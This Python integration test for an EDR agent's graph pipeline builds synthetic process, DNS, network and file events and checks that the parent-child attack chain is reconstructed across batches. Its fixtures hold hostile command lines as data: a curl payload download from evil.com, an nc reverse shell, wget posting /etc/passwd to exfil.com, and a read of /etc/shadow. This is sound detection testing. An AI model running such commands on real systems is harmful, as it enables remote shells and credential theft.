#!/usr/bin/env python3
"""Live integration test: synthesize traffic with parent-child PIDs,
process through the full pipeline, and verify the graph shows the
complete chain — updated across multiple batches.

Usage:
    python -m tests.test_live_chain
"""

from __future__ import annotations

import json
import shutil
import sys
import tempfile
from datetime import UTC, datetime
from pathlib import Path

import kuzu

# Ensure project root is on path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from agent.collectors.base import RawEvent
from agent.config import Settings
from agent.graph.queries import (
    build_attack_chain,
    get_process_chain,
    get_process_children,
    get_process_tree,
    serialize_attack_chain,
)
from agent.normalizer import normalize
from agent.processor.entity_extractor import extract_entities
from agent.processor.graph_builder import GraphBuilder
from agent.queue.sqlite_queue import SqliteQueue
from agent.schema.kuzu_schema import init_graph_schema

# ── Helpers ──────────────────────────────────────────────────────────

HOSTNAME = "test-host"
T0 = datetime(2025, 6, 15, 10, 0, 0, tzinfo=UTC)


def ts(offset_sec: int = 0) -> datetime:
    """Return T0 + offset."""
    from datetime import timedelta

    return T0 + timedelta(seconds=offset_sec)


def make_process_event(
    pid: int,
    name: str,
    ppid: int,
    username: str,
    cmdline: str = "",
    exe: str = "",
    create_time: datetime | None = None,
    offset: int = 0,
) -> RawEvent:
    fields = {
        "pid": str(pid),
        "name": name,
        "ppid": str(ppid),
        "username": username,
        "cmdline": cmdline,
        "exe": exe or f"/usr/bin/{name}",
    }
    if create_time:
        fields["create_time"] = create_time.isoformat()
    return RawEvent(
        timestamp=ts(offset),
        source="psutil_process",
        message=f"process launched: {name}",
        fields=fields,
        hostname=HOSTNAME,
    )


def make_network_event(
    pid: int,
    process_name: str,
    dst_ip: str,
    dst_port: int,
    offset: int = 0,
) -> RawEvent:
    return RawEvent(
        timestamp=ts(offset),
        source="psutil_network",
        message=f"connection to {dst_ip}:{dst_port}",
        fields={
            "pid": str(pid),
            "process_name": process_name,
            "dst_ip": dst_ip,
            "dst_port": str(dst_port),
        },
        hostname=HOSTNAME,
    )


def make_dns_event(
    pid: int,
    process_name: str,
    domain: str,
    resolved_ips: str,
    offset: int = 0,
) -> RawEvent:
    return RawEvent(
        timestamp=ts(offset),
        source="dns_resolve",
        message=f"dns query: {domain}",
        fields={
            "pid": str(pid),
            "name": process_name,
            "query_domain": domain,
            "resolved_ips": resolved_ips,
        },
        hostname=HOSTNAME,
    )


def make_file_event(
    pid: int,
    process_name: str,
    file_path: str,
    event_type: str = "file_create",
    offset: int = 0,
) -> RawEvent:
    return RawEvent(
        timestamp=ts(offset),
        source=event_type,
        message=f"file {event_type}: {file_path}",
        fields={
            "pid": str(pid),
            "name": process_name,
            "file_path": file_path,
            "event_type": event_type,
        },
        hostname=HOSTNAME,
    )


def process_event_batch(
    events: list[RawEvent],
    queue: SqliteQueue,
    builder: GraphBuilder,
    start_event_id: int = 1,
) -> int:
    """Push events to queue, normalize, extract, write to graph.
    Returns the next event_id to use."""
    # Push to queue
    json_events = [e.to_json() for e in events]
    queue.push_many(json_events)

    # Process each event
    event_id = start_event_id
    entity_batch = []
    for raw_event in events:
        ocsf = normalize(raw_event)
        if ocsf is None:
            continue
        entities = extract_entities(ocsf, event_id)
        entity_batch.append(entities)
        event_id += 1

    # Write to graph
    for entities in entity_batch:
        builder.write_entities(entities)

    return event_id


def separator(title: str) -> None:
    print(f"\n{'=' * 60}")
    print(f"  {title}")
    print(f"{'=' * 60}\n")


# ── Main Test ────────────────────────────────────────────────────────


def main() -> int:
    data_dir = Path(tempfile.mkdtemp(prefix="edr_chain_test_"))
    print(f"Data directory: {data_dir}")

    try:
        return _run_test(data_dir)
    finally:
        shutil.rmtree(data_dir, ignore_errors=True)


def _run_test(data_dir: Path) -> int:
    graph_path = data_dir / "graph"
    db_path = data_dir / "queue.db"

    # Initialize
    kuzu_db = kuzu.Database(str(graph_path))
    conn = kuzu.Connection(kuzu_db)
    init_graph_schema(conn)

    Settings(data_dir=data_dir)  # validates data_dir structure
    queue = SqliteQueue(str(db_path))
    builder = GraphBuilder(kuzu_db)

    errors = 0

    # ── BATCH 1: Build the attack chain ──────────────────────────
    separator("BATCH 1: Building process tree (zsh → curl → python → nc)")

    # The kill chain:
    #   root (user) → zsh (PID 100, ppid=1)
    #     └─ curl (PID 200, ppid=100) — downloads payload
    #         └─ python (PID 300, ppid=200) — executes payload
    #             └─ nc (PID 400, ppid=300) — reverse shell

    batch1_events = [
        # zsh spawned by root
        make_process_event(
            100, "zsh", ppid=1, username="root", cmdline="/bin/zsh -c './attack.sh'", create_time=ts(0), offset=0
        ),
        # curl spawned by zsh
        make_process_event(
            200,
            "curl",
            ppid=100,
            username="root",
            cmdline="curl -o /tmp/payload.py https://evil.com/payload",
            create_time=ts(1),
            offset=1,
        ),
        # curl DNS resolution
        make_dns_event(200, "curl", "evil.com", "93.184.216.34", offset=2),
        # curl network connection
        make_network_event(200, "curl", "93.184.216.34", 443, offset=3),
        # curl creates payload file
        make_file_event(200, "curl", "/tmp/payload.py", "file_create", offset=4),
        # python spawned by curl (executes downloaded payload)
        make_process_event(
            300, "python3", ppid=200, username="root", cmdline="python3 /tmp/payload.py", create_time=ts(5), offset=5
        ),
        # python creates a file
        make_file_event(300, "python3", "/tmp/.backdoor.sh", "file_create", offset=6),
        # nc (reverse shell) spawned by python
        make_process_event(
            400, "nc", ppid=300, username="root", cmdline="nc -e /bin/sh 10.0.0.99 4444", create_time=ts(7), offset=7
        ),
        # nc connects to C2
        make_network_event(400, "nc", "10.0.0.99", 4444, offset=8),
    ]

    next_id = process_event_batch(batch1_events, queue, builder, start_event_id=1)
    print(f"Processed {len(batch1_events)} events (event IDs 1-{next_id - 1})")

    # ── Verify process chain (ancestor walk) ─────────────────────
    separator("VERIFY: Process chain (ancestor walk from nc PID 400)")

    chain = get_process_chain(conn, 400)
    print(f"Chain length: {len(chain)} steps")
    for i, step in enumerate(chain):
        if step.get("type") == "user":
            print(f"  [{i}] User: {step.get('name')}")
        else:
            print(f"  [{i}] {step.get('name')} (PID {step.get('pid')}, ppid={step.get('parent_pid')})")

    # Verify: should have user + zsh + curl + python + nc = 5 steps
    expected_chain_len = 5  # user:root, zsh(100), curl(200), python3(300), nc(400)
    if len(chain) != expected_chain_len:
        print(f"  ERROR: Expected {expected_chain_len} steps, got {len(chain)}")
        errors += 1
    else:
        print(f"  OK: Chain has {expected_chain_len} steps as expected")

    # Verify chain order
    if len(chain) >= 5:
        if chain[0].get("type") != "user":
            print(f"  ERROR: First step should be user, got {chain[0]}")
            errors += 1
        if chain[1].get("pid") != 100:
            print(f"  ERROR: Second step should be PID 100 (zsh), got {chain[1].get('pid')}")
            errors += 1
        if chain[4].get("pid") != 400:
            print(f"  ERROR: Last step should be PID 400 (nc), got {chain[4].get('pid')}")
            errors += 1

    # ── Verify children ──────────────────────────────────────────
    separator("VERIFY: Children of zsh (PID 100)")

    children = get_process_children(conn, 100)
    print(f"Children of zsh: {len(children)}")
    for child in children:
        print(f"  - {child.get('name')} (PID {child.get('pid')})")

    if len(children) != 1 or children[0].get("pid") != 200:
        print("  ERROR: Expected 1 child (curl PID 200)")
        errors += 1
    else:
        print("  OK: curl (PID 200) is the only child")

    # ── Verify full process tree ─────────────────────────────────
    separator("VERIFY: Full process tree from curl (PID 200)")

    tree = get_process_tree(conn, 200)
    if tree is None:
        print("  ERROR: get_process_tree returned None!")
        errors += 1
    else:
        target = tree["target"]
        ancestors = tree["ancestors"]
        print(f"Target: {target['name']} (PID {target['pid']})")
        print(f"Ancestors: {len(ancestors)}")
        for anc in ancestors:
            print(f"  - {anc['name']} (PID {anc['pid']})")

        # Check descendants
        children_of_target = target.get("children", [])
        print(f"Children of target: {len(children_of_target)}")
        for child in children_of_target:
            print(f"  - {child['name']} (PID {child['pid']})")
            for grandchild in child.get("children", []):
                print(f"    - {grandchild['name']} (PID {grandchild['pid']})")

        # curl should have: ancestor=zsh, child=python3, grandchild=nc
        if len(ancestors) != 1 or ancestors[0]["pid"] != 100:
            print("  ERROR: Expected 1 ancestor (zsh PID 100)")
            errors += 1
        if len(children_of_target) != 1 or children_of_target[0]["pid"] != 300:
            print("  ERROR: Expected 1 child (python3 PID 300)")
            errors += 1
        else:
            grandchildren = children_of_target[0].get("children", [])
            if len(grandchildren) != 1 or grandchildren[0]["pid"] != 400:
                print("  ERROR: Expected 1 grandchild (nc PID 400)")
                errors += 1
            else:
                print("  OK: Full tree structure correct")

        # Check network/file activity on target
        print(f"\nTarget network activity: {len(target.get('network', []))} items")
        for item in target.get("network", []):
            print(f"  - {item}")
        print(f"Target file activity: {len(target.get('files', []))} items")
        for item in target.get("files", []):
            print(f"  - {item}")

    # ── Verify build_attack_chain ────────────────────────────────
    separator("VERIFY: build_attack_chain for nc (PID 400)")

    attack_chain = build_attack_chain(conn, 400)
    target_proc = attack_chain["target_process"]
    proc_chain = attack_chain["process_chain"]
    child_procs = attack_chain["child_processes"]

    print(f"Target: {target_proc.get('name')} (PID {target_proc.get('pid')})")
    print(f"User: {target_proc.get('user')}")
    print(f"Process chain: {len(proc_chain)} steps")
    for step in proc_chain:
        print(f"  - {step['name']} (PID {step['pid']}, ppid={step.get('parent_pid')})")
    print(f"Child processes: {len(child_procs)}")
    print(f"Network: {json.dumps(attack_chain['network_footprint'], indent=2, default=str)}")

    if target_proc.get("parent_pid") != 300:
        print(f"  ERROR: nc parent_pid should be 300, got {target_proc.get('parent_pid')}")
        errors += 1
    if target_proc.get("user") != "root":
        print(f"  ERROR: user should be 'root', got {target_proc.get('user')}")
        errors += 1
    if len(proc_chain) != 4:  # zsh, curl, python, nc
        print(f"  ERROR: Expected 4-step process chain, got {len(proc_chain)}")
        errors += 1
    else:
        names = [s["name"] for s in proc_chain]
        expected_names = ["zsh", "curl", "python3", "nc"]
        if names != expected_names:
            print(f"  ERROR: Chain names {names} != {expected_names}")
            errors += 1
        else:
            print("  OK: Attack chain correct")

    # ── Verify serialization ─────────────────────────────────────
    separator("VERIFY: serialize_attack_chain output")

    serialized = serialize_attack_chain(attack_chain)
    print(serialized)
    print()

    # Check key elements in serialized output
    checks = [
        ("zsh (PID 100)" in serialized, "zsh PID 100 in output"),
        ("curl (PID 200)" in serialized, "curl PID 200 in output"),
        ("python3 (PID 300)" in serialized, "python3 PID 300 in output"),
        ("nc (PID 400)" in serialized, "nc PID 400 in output"),
    ]
    for passed, label in checks:
        if not passed:
            print(f"  ERROR: {label} not found")
            errors += 1
        else:
            print(f"  OK: {label}")

    # ── BATCH 2: Add more activity for existing PIDs ─────────────
    separator("BATCH 2: Adding more activity for existing PIDs")

    batch2_events = [
        # python3 resolves another domain
        make_dns_event(300, "python3", "c2-server.net", "185.100.87.202", offset=20),
        # python3 connects to new C2
        make_network_event(300, "python3", "185.100.87.202", 8443, offset=21),
        # python3 creates another file
        make_file_event(300, "python3", "/tmp/.config/cron.sh", "file_create", offset=22),
        # nc sends data to C2
        make_network_event(400, "nc", "10.0.0.99", 4444, offset=23),
        # New child of python3: wget (data exfil)
        make_process_event(
            500,
            "wget",
            ppid=300,
            username="root",
            cmdline="wget --post-file=/etc/passwd https://exfil.com/drop",
            create_time=ts(24),
            offset=24,
        ),
        make_dns_event(500, "wget", "exfil.com", "198.51.100.1", offset=25),
        make_network_event(500, "wget", "198.51.100.1", 443, offset=26),
    ]

    next_id = process_event_batch(batch2_events, queue, builder, start_event_id=next_id)
    print(f"Processed {len(batch2_events)} more events (event IDs up to {next_id - 1})")

    # ── Verify updated tree after batch 2 ────────────────────────
    separator("VERIFY: Updated tree after batch 2")

    tree2 = get_process_tree(conn, 200)  # curl
    if tree2 is None:
        print("  ERROR: get_process_tree returned None after batch 2!")
        errors += 1
    else:
        # curl's child (python3) should now have 2 children: nc + wget
        curl_children = tree2["target"].get("children", [])
        print(f"curl's children: {len(curl_children)}")
        for child in curl_children:
            print(f"  - {child['name']} (PID {child['pid']})")
            for gc in child.get("children", []):
                print(f"    - {gc['name']} (PID {gc['pid']})")
                for item in gc.get("network", []):
                    print(f"      Network: {item}")

        if len(curl_children) != 1:
            print("  ERROR: curl should have 1 direct child (python3)")
            errors += 1
        else:
            python_node = curl_children[0]
            python_children = python_node.get("children", [])
            python_child_pids = {c["pid"] for c in python_children}
            if python_child_pids != {400, 500}:
                print(f"  ERROR: python3 should have children nc(400) + wget(500), got {python_child_pids}")
                errors += 1
            else:
                print("  OK: python3 now has 2 children (nc + wget)")

            # Check python3's new network activity
            python_network = python_node.get("network", [])
            print(f"\n  python3 network activity: {len(python_network)} items")
            for item in python_network:
                print(f"    - {item}")

            python_files = python_node.get("files", [])
            print(f"  python3 file activity: {len(python_files)} items")
            for item in python_files:
                print(f"    - {item}")

    # ── Verify updated attack chain after batch 2 ────────────────
    separator("VERIFY: Updated attack chain for python3 (PID 300)")

    attack_chain2 = build_attack_chain(conn, 300)
    child_procs2 = attack_chain2["child_processes"]
    print(f"python3 child_processes: {len(child_procs2)}")
    for cp in child_procs2:
        print(f'  - {cp["name"]} (PID {cp["pid"]}) cmd="{cp.get("cmd_line", "")}"')
        for net in cp.get("network", []):
            print(f"    Network: {net}")

    child_pids2 = {cp["pid"] for cp in child_procs2}
    if child_pids2 != {400, 500}:
        print(f"  ERROR: Expected children {{400, 500}}, got {child_pids2}")
        errors += 1
    else:
        print("  OK: Attack chain includes both nc and wget as children")

    # ── Updated serialization ────────────────────────────────────
    separator("VERIFY: Updated serialized chain for python3")

    serialized2 = serialize_attack_chain(attack_chain2)
    print(serialized2)
    print()

    # Verify wget appears in the tree
    if "wget (PID 500)" in serialized2:
        print("  OK: wget (PID 500) appears in serialized chain")
    else:
        print("  ERROR: wget (PID 500) missing from serialized chain")
        errors += 1

    if "nc (PID 400)" in serialized2:
        print("  OK: nc (PID 400) appears in serialized chain")
    else:
        print("  ERROR: nc (PID 400) missing from serialized chain")
        errors += 1

    # ── BATCH 3: Yet another child spawns from nc ────────────────
    separator("BATCH 3: nc spawns sh (interactive shell)")

    batch3_events = [
        make_process_event(600, "sh", ppid=400, username="root", cmdline="/bin/sh -i", create_time=ts(30), offset=30),
        make_file_event(600, "sh", "/etc/shadow", "file_read", offset=31),
        make_network_event(600, "sh", "10.0.0.99", 4445, offset=32),
    ]

    next_id = process_event_batch(batch3_events, queue, builder, start_event_id=next_id)
    print(f"Processed {len(batch3_events)} more events")

    # Verify the full chain depth: zsh → curl → python3 → nc → sh
    separator("VERIFY: Full 5-level deep chain from sh (PID 600)")

    chain3 = get_process_chain(conn, 600)
    print(f"Chain from sh (PID 600): {len(chain3)} steps")
    for i, step in enumerate(chain3):
        if step.get("type") == "user":
            print(f"  [{i}] User: {step.get('name')}")
        else:
            print(f"  [{i}] {step.get('name')} (PID {step.get('pid')})")

    # Should be: user + zsh(100) + curl(200) + python3(300) + nc(400) + sh(600) = 6
    if len(chain3) != 6:
        print(f"  ERROR: Expected 6-step chain (user + 5 processes), got {len(chain3)}")
        errors += 1
    else:
        expected_pids = [100, 200, 300, 400, 600]
        actual_pids = [s.get("pid") for s in chain3 if s.get("type") != "user"]
        if actual_pids != expected_pids:
            print(f"  ERROR: Expected PIDs {expected_pids}, got {actual_pids}")
            errors += 1
        else:
            print("  OK: Full 5-level chain correct")

    # ── Final: Full tree from root (zsh) ─────────────────────────
    separator("FINAL: Complete tree from root zsh (PID 100)")

    full_tree = get_process_tree(conn, 100)
    if full_tree is None:
        print("  ERROR: get_process_tree returned None for root!")
        errors += 1
    else:

        def count_tree_nodes(node: dict) -> int:
            count = 1
            for child in node.get("children", []):
                count += count_tree_nodes(child)
            return count

        total = count_tree_nodes(full_tree["target"])
        print(f"Total processes in tree: {total}")
        # zsh, curl, python3, nc, wget, sh = 6
        if total != 6:
            print(f"  ERROR: Expected 6 processes total, got {total}")
            errors += 1
        else:
            print("  OK: All 6 processes in the tree")

        # Print final tree
        def print_tree(node: dict, indent: int = 0) -> None:
            prefix = "  " * indent
            net = node.get("network", [])
            files = node.get("files", [])
            net_str = f" [net:{len(net)}, files:{len(files)}]" if net or files else ""
            print(f"{prefix}{node['name']} (PID {node['pid']}, ppid={node.get('parent_pid')}){net_str}")
            for item in net:
                if "domain" in item:
                    print(f"{prefix}  DNS: {item['domain']}")
                elif "address" in item:
                    print(f"{prefix}  -> {item['address']}:{item.get('port')}")
            for item in files:
                print(f"{prefix}  {item.get('operation', '?')}: {item.get('file_path', '?')}")
            for child in node.get("children", []):
                print_tree(child, indent + 1)

        print("\nFull process tree:")
        if full_tree["ancestors"]:
            for anc in full_tree["ancestors"]:
                print(f"  (ancestor) {anc['name']} (PID {anc['pid']})")
        print_tree(full_tree["target"], indent=1)

    # ── Summary ──────────────────────────────────────────────────
    separator("SUMMARY")

    if errors == 0:
        print("ALL CHECKS PASSED!")
        print("\nThe graph correctly:")
        print("  - Stores parent_pid on all process nodes")
        print("  - Walks the ancestor chain upward via parent_pid")
        print("  - Discovers children via parent_pid")
        print("  - Builds full trees (ancestors + descendants) with BFS")
        print("  - Attaches network and file activity to each tree node")
        print("  - Updates the tree across batch processing")
        print("  - Maintains chain integrity as new children spawn")
        return 0
    else:
        print(f"FAILED: {errors} check(s) failed")
        return 1


if __name__ == "__main__":
    sys.exit(main())
